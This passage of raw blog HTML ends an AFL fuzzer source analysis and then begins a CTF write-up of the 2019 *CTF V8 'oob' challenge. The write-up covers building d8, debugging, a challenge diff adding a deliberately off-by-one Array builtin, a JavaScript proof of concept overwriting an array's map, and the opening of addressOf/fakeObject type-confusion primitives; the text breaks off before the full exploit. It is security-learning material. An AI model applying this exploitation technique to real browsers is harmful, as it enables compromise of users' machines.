class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">classify_counts</span><span class="params">(u64* mem)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i = MAP_SIZE &gt;&gt; <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (i--) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Optimize for sparse bitmaps. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">unlikely</span>(*mem)) &#123;</span><br><span class="line"></span><br><span class="line">      u16* mem16 = (u16*)mem;</span><br><span class="line"></span><br><span class="line">      mem16[<span class="number">0</span>] = count_class_lookup16[mem16[<span class="number">0</span>]];</span><br><span class="line">      mem16[<span class="number">1</span>] = count_class_lookup16[mem16[<span class="number">1</span>]];</span><br><span class="line">      mem16[<span class="number">2</span>] = count_class_lookup16[mem16[<span class="number">2</span>]];</span><br><span class="line">      mem16[<span class="number">3</span>] = count_class_lookup16[mem16[<span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mem++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u16 count_class_lookup16[<span class="number">65536</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++) </span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">        (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        count_class_lookup8[b2];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上这里和32位下面的处理是相同的。这里32位的count_class如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line"></span><br><span class="line">  [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">  [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">  [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">  [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">  [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">  [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">  [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">  [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">  [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>也就是模糊了命中次数这个概念，而是用一个范围来表示命中次数。这个范围在AFL表示为一个桶。也就是命中次数从一个桶转换到另一个桶才会被认为命中次数发生了改变。</p><h1 id="AFL总结"><a href="#AFL总结" class="headerlink" title="AFL总结"></a>AFL总结</h1><p>这里对于一些无关的参数处理或者说初始化我们跳过，只关注核心的部分</p><ol><li><p>首先这里进行共享内存的初始化，通过调用<code>shmget</code> 分配了MAP_SIZE大小的共享内存，分别被AFL进程和目标进程映射到各自的地址空间中，作为记录路径信息的内存空间。这里记录路径信息的时候对于每个基本块都随机分配了一个MAP_SIZE中的随机值。而对于A→B这样的路径元组其对应的MAP中的位置为<code>shared_mem[(A&gt;&gt;1)^B]</code> 。</p><p>这里目标进程通过插桩的方式插入相应的路径记录信息的代码，以及Forserver的代码。</p></li><li><p>初始化完成之后，对于所有的测试用例会首先进行第一轮的Fuzz，也就是DryRun，第一次运行的目的是对测试用例进行校准，初始化所有测试用例的当前的路径信息，并依据这个路径信息执行优胜者策略。这里优胜者测试用例的选择是对于某一个特定的路径元组例如A→B，执行时间最短并且文件最小的则是当前路径元组的优胜者。但是并不是所有的优胜者都会被欢迎。AFL只会欢迎第一次看到的优胜者测试用例。</p></li><li><p>接下来就是主Fuzz循环，每次循环之前都会执行样本选择，也就是执行优胜者策略。之后按照相应的策略选择当前这一轮要执行Fuzz的测试用例样本，具体的策略如下</p><ol><li><p>如果队列中存在还没有被Fuzz的受欢迎的优胜者测试用例</p><ol><li>当前的测试用例已经被Fuzz过了或者当前的测试用例不是受欢迎的优胜者测试用例，那么将会有99%的概率跳过这个测试用例</li></ol><p>也就是这里会以很大的概率去寻找还没有被Fuzz的受欢迎的优胜者测试用例</p></li><li><p>如果队列中所有受欢迎的优胜者测试用例都被Fuzz了</p><ol><li>如果当前的测试用例是受欢迎的优胜者，那么选择当前的测试用例</li><li>如果当前的测试用例不是受欢迎的优胜者并且测试用例的总数大于10<ol><li>当前的测试用例没有被Fuzz过，75%的概率跳过这个测试用例</li><li>当前测试用例被Fuzz过，95%概率跳过这个测试用例</li></ol></li></ol></li></ol></li><li><p>对当前测试用例执行剪枝操作，主要目的是减少测试用例文件的大小。具体的策略是首先选择一个大的步长，依次删除测试用例文件中相应的部分，观察路径信息是否发生变化，如果没有发生变化那么就将这一块内容从测试用例中删除。之后依次减少步长，直到达到最小步长，之后将更改之后的文件写入到磁盘文件，更新优胜者队列。更改之后的文件作为结下来要Fuzz的文件</p><p>5字节一下的文件不会执行剪枝操作。</p></li><li><p>之后对当前的这个测试用例进行打分，执行速度越快、发现路径的数量越多、最近发现新路径的以及发现的路径越深的则分数更高，在后续的随机变异中将会获取得到更多的执行轮数。</p></li><li><p>接下来就是变异的操作了。这里会涉及到6种类型的遍历。分别是bit翻转、算数加减、interesting数值运算、字典替换、随机变异、不同测试用例之间的拼接。这里我们要注意几个变异策略的作用</p><ol><li>第一次变异即步长为1，每次翻转1bit是用来探测固定结构的，也就是探测类似于Magic Number等。这里如果前几个字节的最后一个bit翻转之后所得到的路径信息相同，那么我们就可以认为这几个字节为一个Token，也就是固定字节。</li><li>步长为1字节，每次翻转1字节则是用来初始化eff_map的，该map会指导后续的遍历过程。也就是对于翻转后路径信息不变的字节，那么在之后的变异过程中也不会再对这个字节进行变异。</li><li>INTERESTING VALUES实际上也是一种算数运算操作，不过这里的算数则是一些边界值</li></ol></li><li><p>每次变异都会将变异的文件写入到磁盘文件中，之后执行目标程序。如果变异之后的样本产生了新的路径或者路径元组命中次数发生了变化，那么这里就会将变异之后的文件写入到测试用例文件夹中。如果没有发生hangs或者crash，那么就会将这个变异之后的测试用例加入到队列中。之后继续从第4步开始执行直至退出。</p></li></ol><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xidoo.top/2022/01/afl-white-book/#0-%E8%AE%BE%E8%AE%A1%E9%99%88%E8%BF%B0-design-statement">AFL 白皮书翻译与读书笔记</a></p>]]></content>
      
      
      <categories>
          
          <category> 源码分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>V8 重新入门-2019 starCTF oob 题解</title>
      <link href="/posts/1029211104.html"/>
      <url>/posts/1029211104.html</url>
      
        <content type="html"><![CDATA[<p>一年多前调试的V8的题目了，都忘光了，只记得用了类型混淆，难搞，准备看之前做2019年的*ctf的oob这道题目重新入门一下（这个题解之前的博客上有，但是因为我重新弄了一个博客图床变了，有时间再全迁移到新的上面），不知道V8又多了什么保护机制啥的。</p><h2 id="编译V8"><a href="#编译V8" class="headerlink" title="编译V8"></a>编译V8</h2><p>额，编译<code>V8</code>就是个大坑。。。</p><p><code>V8</code>是<code>chrome</code>中的<code>JS</code>解释器，经过<code>v8</code>编译之后的可执行文件为<code>d8</code>。下载源码的过程需要连接外网，因此可以通过设置代理或者直接在云服务器上操作。</p><p>首先安装一些之后用到的工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># clone并且configure</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/path/to/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure><p>接下来就是下载源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> v8</span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line">fetch v8</span><br></pre></td></tr></table></figure><p>下载源码过程中中断的话，可以使用<code>gclient syc</code>继续下载。</p><blockquote><p> 这里我使用的是主机的代理，在系统选项中设置好即可(<code>all_proxy</code>环境变量设置)。但是<code>gclinet syc</code>中的某些命令在设置完代理之后也无法连接<code>google</code>的服务器，这里将<code>download_from_google_storage.py</code>中的下载改写为调用<code>wget</code>下载（<a href="https://github.com/liuzhongchina521/BlogAttachment/tree/master/starCTF2019/oob">改写后的脚本</a>）</p></blockquote><p>在编译之前需要将源码的版本<code>reset</code>到和题目一致的版本，并将题目给出的<code>diff</code>文件应用到源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">git apply &lt; oob.diff</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tools/dev/v8gen.py x64.debug</span><br><span class="line">sudo ../../ninja/ninja -C out.gn/x64.debug d8</span><br></pre></td></tr></table></figure><p>这里编译时出现了错误</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/60dfaa7d97c54078fa8a370f69ca305.png" alt="图片无法显示，请联系作者" title=" "><p>应该是<code>gcc/libc</code>版本的问题，在<code>ubuntu 16.04</code>成功编译。</p><h2 id="调试V8"><a href="#调试V8" class="headerlink" title="调试V8"></a>调试V8</h2><p><code>V8</code>的官方团队编写了调试<code>V8</code>用的<code>gdbinit</code>，位于<code>tools</code>目录之下，在<code>gdbinit</code>中添加<code>source</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/tools/gdbinit</span><br><span class="line"><span class="built_in">source</span> /home/pwn/Desktop/v8/v8-<span class="built_in">source</span>/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>在调试时使用<code>allow-natives-syntax</code>能够定义一些<code>V8</code>运行时支持的函数，便于调试。一般调试为<code>gdb ./d8;set args --allow-natives-syntax ./test.js</code>。使用<code>%DebugPrint(var)</code>来输出变量的详细信息，使用<code>%SystemBreak()</code>触发调试中断。<code>job</code>可以可视化的显示<code>JS</code>对象的内存结构，<code>telescope addr [count]</code>可用来输出<code>addr</code>地址之后<code>count</code>长度的内存数据。这里需要注意的是在<code>release</code>版本下没有调试符号没办法调用<code>job</code>命令。编写一个<code>test.js</code>用来调试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%<span class="title class_">DebugPrint</span>(c);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure><p><code>gdb</code>运行<code>d8</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200803222551.png" alt="图片无法显示，请联系作者" title=" "><p>首先打印出了变量<code>a</code>的内存地址，接着进入了第一次调试。我们看一下<code>a</code>的内存结构</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job 0x3d31081081d5</span><br><span class="line">0x3d31081081d5: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3865 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d31082920b5 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d31082920b5 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其中<code>map</code>表示了当前结构体的类型，<code>elements</code>表示对象元素，存储数据的地方，<code>length</code>表示元素的个数，<code>properties</code>为属性。这里需要注意的是<code>V8</code>中只有数字和对象两种结构，为了区分二者，<code>V8</code>在所有的对象的内存地址的末尾都加了<code>1</code>。因此该对象的内存地址为<code>0x3d31081081d4</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">DebugPrint: 0x3d3108108209: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3905 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d31081081e9 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d31081081e9 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><code>int</code>类型和<code>double</code>类型的数组的数据结构相似，<code>elements</code>对象的地址就在<code>array</code>结构的不远处。下面再看看对象数组的结构体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">DebugPrint: 0x3d3108108229: [JSArray]</span><br><span class="line"> - map: 0x3d31082c3955 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d310828b2b9 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d3108108219 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x3d31080426e5 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    0x3d310804464d: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d3108202161 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d3108108219 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3d31081081d5 &lt;JSArray[3]&gt;</span><br><span class="line">           1: 0x3d3108108209 &lt;JSArray[3]&gt;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>我们可以看到在<code>elements</code>中存储的是两个数组的地址。从上面的分析中我们可以得到不同类型数组的<code>map</code>值是不同的。存储数据的<code>elements</code>对象的地址在数组地址之前，可见首先是分配了存储数据的<code>elements</code>对象，在分配了结构体的内存。</p><h3 id="V8对象结构"><a href="#V8对象结构" class="headerlink" title="V8对象结构"></a>V8对象结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elements-------&gt;MAP</span><br><span class="line">Length</span><br><span class="line">element_1</span><br><span class="line">...</span><br><span class="line">element_n</span><br><span class="line">ArrayObject----&gt;MAP</span><br><span class="line">ProtoType</span><br><span class="line">elements指针</span><br><span class="line">Length</span><br><span class="line">properties</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>浏览器的<code>CTF</code>一般会采用两种方式，一种是直接给出一个<code>cve</code>漏洞，另一个就是给出一个<code>diff</code>文件，这需要我们自己去下载<code>commit</code>的源码，编译得到<code>diff</code>补丁过的浏览器程序。<code>oob</code>就给出了一个<code>diff</code>文件，这个我们已经编译完成。下面我们分析一下<code>diff</code>文件。</p><p>首先先是注册了<code>oob</code>函数，在内部表示为<code>kArrayOob</code></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">index b027d36..ef1002f 100644</span></span><br><span class="line"><span class="comment">--- a/src/bootstrapper.cc</span></span><br><span class="line"><span class="comment">+++ b/src/bootstrapper.cc</span></span><br><span class="line"><span class="meta">@@ -1668,6 +1668,8 @@</span> void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line"><span class="addition">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span></span><br><span class="line"><span class="addition">+                          Builtins::kArrayOob,2,false);</span></span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br></pre></td></tr></table></figure><p>接着实现了具体的<code>oob</code>函数</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">index 8df340e..9b828ab 100644</span></span><br><span class="line"><span class="comment">--- a/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="comment">+++ b/src/builtins/builtins-array.cc</span></span><br><span class="line"><span class="meta">@@ -361,6 +361,27 @@</span> V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"><span class="addition">+BUILTIN(ArrayOob)&#123;</span></span><br><span class="line"><span class="addition">+    uint32_t len = args.length();</span></span><br><span class="line"><span class="addition">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSReceiver&gt; receiver;</span></span><br><span class="line"><span class="addition">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span></span><br><span class="line"><span class="addition">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span></span><br><span class="line"><span class="addition">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span></span><br><span class="line"><span class="addition">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span></span><br><span class="line"><span class="addition">+    if(len == 1)&#123;</span></span><br><span class="line"><span class="addition">+        //read</span></span><br><span class="line"><span class="addition">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span></span><br><span class="line"><span class="addition">+    &#125;else&#123;</span></span><br><span class="line"><span class="addition">+        //write</span></span><br><span class="line"><span class="addition">+        Handle&lt;Object&gt; value;</span></span><br><span class="line"><span class="addition">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span></span><br><span class="line"><span class="addition">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span></span><br><span class="line"><span class="addition">+        elements.set(length,value-&gt;Number());</span></span><br><span class="line"><span class="addition">+        return ReadOnlyRoots(isolate).undefined_value();</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br></pre></td></tr></table></figure><p>后面的代码将该函数与<code>kArrayOob</code>关联起来。我们主要分析一下<code>oob</code>函数的实现。因为<code>C++</code>成员变量的第一个参数一定是<code>this</code>指针。因此当函数的参数大于<code>1</code>的时候直接返回，当参数没有参数的时候返回<code>length</code>地址处的内容，当参数等于<code>1</code>的时候将第一个参数写入数组的第<code>length</code>位置。</p><p>由于数组是从<code>0</code>开始计数的，因此写入第<code>length</code>个位置的时候就存在<code>off-by-one</code>漏洞。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2.2</span>,<span class="number">3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">a.<span class="title function_">oob</span>();</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第一次调试</span></span><br><span class="line">a.<span class="title function_">oob</span>(<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">toString</span>());</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();  <span class="comment">//触发第二次调试</span></span><br></pre></td></tr></table></figure><p>运行到第二次调试之后</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/V8-%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8-2019-starCTF-oob-%E9%A2%98%E8%A7%A3/20200804204842.png" alt="图片无法显示，请联系作者" title=" "><p>我们可以看到数组存储数据的<code>elements</code>的第<code>length</code>个数据已经被改写为了参数<code>1</code>的浮点类型。并且可以注意到此时覆写的恰好就是数组结构的<code>MAP</code>类型。同时如果将<code>a.oob()</code>输出的浮点值转换为<code>16</code>进制可以得知其就是<code>MAP</code>的值，也就是可以任意读写<code>MAP</code>的属性值。</p><blockquote><p>只有浮点类型的数组，数组结构和elements的结构相邻</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>从上述我们可以任意读写数组结构的<code>MAP</code>值，我们可以利用”类型混淆”漏洞。即利用<code>oob</code>将<code>A</code>类型的<code>MAP</code>值读取出来并写入到<code>B</code>类型的<code>MAP</code>区域中，就会导致<code>B</code>对象变成了<code>A</code>对象的数据类型，<code>V8</code>就会按照处理<code>A</code>对象的方法处理<code>B</code>对象的相关数据和结构体。</p><p>当我们将一个对象数组<code>B</code>的类型改写为浮点类型数据的时候，访问<code>B[0]</code>返回的就是<code>B[0]</code>对象的内存地址了；同理当我们将浮点类型数组<code>A</code>改写为对象数组的时候，访问<code>A[0]</code>就是以<code>A[0]</code>为内存地址的一个<code>JS</code>对象了。</p><h3 id="编写addressOf和fakeObject"><a href="#编写addressOf和fakeObject" class="headerlink" title="编写addressOf和fakeObject"></a>编写addressOf和fakeObject</h3><p>要编写的两个功能原语<code>addressOf</code>用来泄露某个对象的地址，<code>fakeObject</code>则将一个内存地址伪造为一个对象。</p><p>首先定义两个全局对象，获取其对象的<code>MAP</code>值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br></pre></td></tr></table></figure><p>接着是泄露指定对象地址的<code>addressOf</code>函数，这里注意的是我们得到的数据都是浮点类型的数据，而我们需要的是内存中的<code>16</code>进制的数据，因此需要编写转换函数</p><figure class="highlight js"><table><tr><td 